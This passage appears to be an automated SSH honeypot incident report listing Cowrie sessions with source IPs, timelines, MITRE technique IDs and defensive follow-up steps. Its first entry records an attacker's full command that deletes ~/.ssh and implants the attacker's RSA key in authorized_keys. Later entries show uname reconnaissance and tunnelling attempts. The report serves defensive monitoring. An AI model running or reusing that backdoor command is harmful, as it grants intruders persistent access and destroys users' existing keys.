| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:36:16` | `cowrie.session.connect` |
| `2026-08-08 03:36:16` | `cowrie.client.version` |
| `2026-08-08 03:36:16` | `cowrie.client.kex` |
| `2026-08-08 03:36:18` | `cowrie.login.success` |
| `2026-08-08 03:36:19` | `cowrie.session.params` |
| `2026-08-08 03:36:19` | `cowrie.command.input` |
| `2026-08-08 03:36:19` | `cowrie.command.failed` |
| `2026-08-08 03:36:19` | `cowrie.log.closed` |
| `2026-08-08 03:36:20` | `cowrie.session.params` |
| `2026-08-08 03:36:20` | `cowrie.command.input` |
| `2026-08-08 03:36:21` | `cowrie.session.file_download` |
| `2026-08-08 03:36:21` | `cowrie.log.closed` |
| `2026-08-08 03:36:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.121[.]186` to AbuseIPDB if not already reported
- [ ] Block `209.38.121[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcee51c75414

| Field | Detail |
|---|---|
| **Source IP** | `209.38.121[.]186` |
| **First Seen** | 2026-08-08 03:36 |
| **Last Seen** | 2026-08-08 03:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:36:21` | `cowrie.session.connect` |
| `2026-08-08 03:36:21` | `cowrie.client.version` |
| `2026-08-08 03:36:21` | `cowrie.client.kex` |
| `2026-08-08 03:36:22` | `cowrie.login.success` |
| `2026-08-08 03:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.121[.]186` to AbuseIPDB if not already reported
- [ ] Block `209.38.121[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3b829f0aa44

| Field | Detail |
|---|---|
| **Source IP** | `209.38.121[.]186` |
| **First Seen** | 2026-08-08 03:36 |
| **Last Seen** | 2026-08-08 03:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:36:22` | `cowrie.session.connect` |
| `2026-08-08 03:36:22` | `cowrie.client.version` |
| `2026-08-08 03:36:23` | `cowrie.client.kex` |
| `2026-08-08 03:36:24` | `cowrie.login.success` |
| `2026-08-08 03:36:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.121[.]186` to AbuseIPDB if not already reported
- [ ] Block `209.38.121[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b18aac0b21e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:37 |
| **Last Seen** | 2026-08-08 03:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:37:08` | `cowrie.session.connect` |
| `2026-08-08 03:37:08` | `cowrie.client.version` |
| `2026-08-08 03:37:08` | `cowrie.client.kex` |
| `2026-08-08 03:37:08` | `cowrie.login.success` |
| `2026-08-08 03:37:09` | `cowrie.session.params` |
| `2026-08-08 03:37:09` | `cowrie.command.input` |
| `2026-08-08 03:37:09` | `cowrie.log.closed` |
| `2026-08-08 03:37:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7b5f5ae9f64

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:38 |
| **Last Seen** | 2026-08-08 03:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:38:54` | `cowrie.session.connect` |
| `2026-08-08 03:38:54` | `cowrie.client.version` |
| `2026-08-08 03:38:54` | `cowrie.client.kex` |
| `2026-08-08 03:38:54` | `cowrie.login.success` |
| `2026-08-08 03:38:55` | `cowrie.session.params` |
| `2026-08-08 03:38:55` | `cowrie.command.input` |
| `2026-08-08 03:38:55` | `cowrie.log.closed` |
| `2026-08-08 03:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42bbd84b913a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:40 |
| **Last Seen** | 2026-08-08 03:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:40:43` | `cowrie.session.connect` |
| `2026-08-08 03:40:43` | `cowrie.client.version` |
| `2026-08-08 03:40:44` | `cowrie.client.kex` |
| `2026-08-08 03:40:44` | `cowrie.login.success` |
| `2026-08-08 03:40:45` | `cowrie.session.params` |
| `2026-08-08 03:40:45` | `cowrie.command.input` |
| `2026-08-08 03:40:45` | `cowrie.log.closed` |
| `2026-08-08 03:40:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1f920b193f1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:42 |
| **Last Seen** | 2026-08-08 03:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:42:33` | `cowrie.session.connect` |
| `2026-08-08 03:42:33` | `cowrie.client.version` |
| `2026-08-08 03:42:33` | `cowrie.client.kex` |
| `2026-08-08 03:42:33` | `cowrie.login.success` |
| `2026-08-08 03:42:34` | `cowrie.session.params` |
| `2026-08-08 03:42:34` | `cowrie.command.input` |
| `2026-08-08 03:42:34` | `cowrie.log.closed` |
| `2026-08-08 03:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5b25053f59d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:44 |
| **Last Seen** | 2026-08-08 03:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:44:16` | `cowrie.session.connect` |
| `2026-08-08 03:44:16` | `cowrie.client.version` |
| `2026-08-08 03:44:16` | `cowrie.client.kex` |
| `2026-08-08 03:44:16` | `cowrie.login.success` |
| `2026-08-08 03:44:17` | `cowrie.session.params` |
| `2026-08-08 03:44:17` | `cowrie.command.input` |
| `2026-08-08 03:44:17` | `cowrie.log.closed` |
| `2026-08-08 03:44:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de8d87bcfc27

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:46 |
| **Last Seen** | 2026-08-08 03:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:46:00` | `cowrie.session.connect` |
| `2026-08-08 03:46:00` | `cowrie.client.version` |
| `2026-08-08 03:46:00` | `cowrie.client.kex` |
| `2026-08-08 03:46:00` | `cowrie.login.success` |
| `2026-08-08 03:46:01` | `cowrie.session.params` |
| `2026-08-08 03:46:01` | `cowrie.command.input` |
| `2026-08-08 03:46:01` | `cowrie.log.closed` |
| `2026-08-08 03:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a54475e3ab4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:47 |
| **Last Seen** | 2026-08-08 03:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:47:48` | `cowrie.session.connect` |
| `2026-08-08 03:47:48` | `cowrie.client.version` |
| `2026-08-08 03:47:49` | `cowrie.client.kex` |
| `2026-08-08 03:47:49` | `cowrie.login.success` |
| `2026-08-08 03:47:50` | `cowrie.session.params` |
| `2026-08-08 03:47:50` | `cowrie.command.input` |
| `2026-08-08 03:47:50` | `cowrie.log.closed` |
| `2026-08-08 03:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-848547827187

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:49 |
| **Last Seen** | 2026-08-08 03:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:49:33` | `cowrie.session.connect` |
| `2026-08-08 03:49:33` | `cowrie.client.version` |
| `2026-08-08 03:49:33` | `cowrie.client.kex` |
| `2026-08-08 03:49:34` | `cowrie.login.success` |
| `2026-08-08 03:49:35` | `cowrie.session.params` |
| `2026-08-08 03:49:35` | `cowrie.command.input` |
| `2026-08-08 03:49:35` | `cowrie.log.closed` |
| `2026-08-08 03:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45bcdd3310cf

| Field | Detail |
|---|---|
| **Source IP** | `92.255.196[.]185` |
| **First Seen** | 2026-08-08 03:50 |
| **Last Seen** | 2026-08-08 03:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:50:57` | `cowrie.session.connect` |
| `2026-08-08 03:50:57` | `cowrie.client.version` |
| `2026-08-08 03:50:57` | `cowrie.client.kex` |
| `2026-08-08 03:50:58` | `cowrie.login.success` |
| `2026-08-08 03:50:58` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:51:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.255.196[.]185` to AbuseIPDB if not already reported
- [ ] Block `92.255.196[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b62998e801bb

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-08 03:50 |
| **Last Seen** | 2026-08-08 03:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:50:59` | `cowrie.session.connect` |
| `2026-08-08 03:50:59` | `cowrie.client.version` |
| `2026-08-08 03:50:59` | `cowrie.client.kex` |
| `2026-08-08 03:51:00` | `cowrie.login.success` |
| `2026-08-08 03:51:00` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:51:00` | `cowrie.direct-tcpip.data` |
| `2026-08-08 03:51:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53b06926839a

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-08-08 03:51 |
| **Last Seen** | 2026-08-08 03:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:51:08` | `cowrie.session.connect` |
| `2026-08-08 03:51:09` | `cowrie.client.version` |
| `2026-08-08 03:51:09` | `cowrie.client.kex` |
| `2026-08-08 03:51:11` | `cowrie.login.success` |
| `2026-08-08 03:51:12` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fee572e3c58c

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:51 |
| **Last Seen** | 2026-08-08 03:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:51:17` | `cowrie.session.connect` |
| `2026-08-08 03:51:17` | `cowrie.client.version` |
| `2026-08-08 03:51:17` | `cowrie.client.kex` |
| `2026-08-08 03:51:17` | `cowrie.login.success` |
| `2026-08-08 03:51:18` | `cowrie.session.params` |
| `2026-08-08 03:51:18` | `cowrie.command.input` |
| `2026-08-08 03:51:18` | `cowrie.log.closed` |
| `2026-08-08 03:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52023c0606c0

| Field | Detail |
|---|---|
| **Source IP** | `45.154.244[.]193` |
| **First Seen** | 2026-08-08 03:53 |
| **Last Seen** | 2026-08-08 03:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:53:01` | `cowrie.session.connect` |
| `2026-08-08 03:53:01` | `cowrie.client.version` |
| `2026-08-08 03:53:01` | `cowrie.client.kex` |
| `2026-08-08 03:53:02` | `cowrie.login.success` |
| `2026-08-08 03:53:02` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:53:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-08 03:53:02` | `cowrie.direct-tcpip.data` |
| `2026-08-08 03:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.154.244[.]193` to AbuseIPDB if not already reported
- [ ] Block `45.154.244[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bbe1ffc530f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:53 |
| **Last Seen** | 2026-08-08 03:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:53:06` | `cowrie.session.connect` |
| `2026-08-08 03:53:06` | `cowrie.client.version` |
| `2026-08-08 03:53:06` | `cowrie.client.kex` |
| `2026-08-08 03:53:06` | `cowrie.login.success` |
| `2026-08-08 03:53:07` | `cowrie.session.params` |
| `2026-08-08 03:53:07` | `cowrie.command.input` |
| `2026-08-08 03:53:07` | `cowrie.log.closed` |
| `2026-08-08 03:53:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4523ed34f3ec

| Field | Detail |
|---|---|
| **Source IP** | `183.238.41[.]121` |
| **First Seen** | 2026-08-08 03:53 |
| **Last Seen** | 2026-08-08 03:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:53:18` | `cowrie.session.connect` |
| `2026-08-08 03:53:18` | `cowrie.client.version` |
| `2026-08-08 03:53:19` | `cowrie.client.kex` |
| `2026-08-08 03:53:21` | `cowrie.login.success` |
| `2026-08-08 03:53:22` | `cowrie.session.params` |
| `2026-08-08 03:53:22` | `cowrie.command.input` |
| `2026-08-08 03:53:23` | `cowrie.log.closed` |
| `2026-08-08 03:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.238.41[.]121` to AbuseIPDB if not already reported
- [ ] Block `183.238.41[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c80d3cda3b3

| Field | Detail |
|---|---|
| **Source IP** | `61.2.44[.]54` |
| **First Seen** | 2026-08-08 03:54 |
| **Last Seen** | 2026-08-08 03:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:54:25` | `cowrie.session.connect` |
| `2026-08-08 03:54:26` | `cowrie.client.version` |
| `2026-08-08 03:54:26` | `cowrie.client.kex` |
| `2026-08-08 03:54:28` | `cowrie.login.success` |
| `2026-08-08 03:54:28` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.44[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.2.44[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fda98e2799f5

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:54 |
| **Last Seen** | 2026-08-08 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:54:56` | `cowrie.session.connect` |
| `2026-08-08 03:54:56` | `cowrie.client.version` |
| `2026-08-08 03:54:56` | `cowrie.client.kex` |
| `2026-08-08 03:54:56` | `cowrie.login.success` |
| `2026-08-08 03:54:57` | `cowrie.session.params` |
| `2026-08-08 03:54:57` | `cowrie.command.input` |
| `2026-08-08 03:54:57` | `cowrie.log.closed` |
| `2026-08-08 03:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1da7a5e2eea

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:56 |
| **Last Seen** | 2026-08-08 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:56:41` | `cowrie.session.connect` |
| `2026-08-08 03:56:41` | `cowrie.client.version` |
| `2026-08-08 03:56:42` | `cowrie.client.kex` |
| `2026-08-08 03:56:42` | `cowrie.login.success` |
| `2026-08-08 03:56:43` | `cowrie.session.params` |
| `2026-08-08 03:56:43` | `cowrie.command.input` |
| `2026-08-08 03:56:43` | `cowrie.log.closed` |
| `2026-08-08 03:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de66474693cc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:58 |
| **Last Seen** | 2026-08-08 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:58:26` | `cowrie.session.connect` |
| `2026-08-08 03:58:26` | `cowrie.client.version` |
| `2026-08-08 03:58:26` | `cowrie.client.kex` |
| `2026-08-08 03:58:27` | `cowrie.login.success` |
| `2026-08-08 03:58:27` | `cowrie.session.params` |
| `2026-08-08 03:58:27` | `cowrie.command.input` |
| `2026-08-08 03:58:27` | `cowrie.log.closed` |
| `2026-08-08 03:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dda7bb4065c9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:00 |
| **Last Seen** | 2026-08-08 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:00:16` | `cowrie.session.connect` |
| `2026-08-08 04:00:16` | `cowrie.client.version` |
| `2026-08-08 04:00:16` | `cowrie.client.kex` |
| `2026-08-08 04:00:17` | `cowrie.login.success` |
| `2026-08-08 04:00:17` | `cowrie.session.params` |
| `2026-08-08 04:00:17` | `cowrie.command.input` |
| `2026-08-08 04:00:18` | `cowrie.log.closed` |
| `2026-08-08 04:00:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f38153382ae

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:02 |
| **Last Seen** | 2026-08-08 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:02:03` | `cowrie.session.connect` |
| `2026-08-08 04:02:03` | `cowrie.client.version` |
| `2026-08-08 04:02:03` | `cowrie.client.kex` |
| `2026-08-08 04:02:03` | `cowrie.login.success` |
| `2026-08-08 04:02:04` | `cowrie.session.params` |
| `2026-08-08 04:02:04` | `cowrie.command.input` |
| `2026-08-08 04:02:04` | `cowrie.log.closed` |
| `2026-08-08 04:02:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b479ea7400e2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:02 |
| **Last Seen** | 2026-08-08 04:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
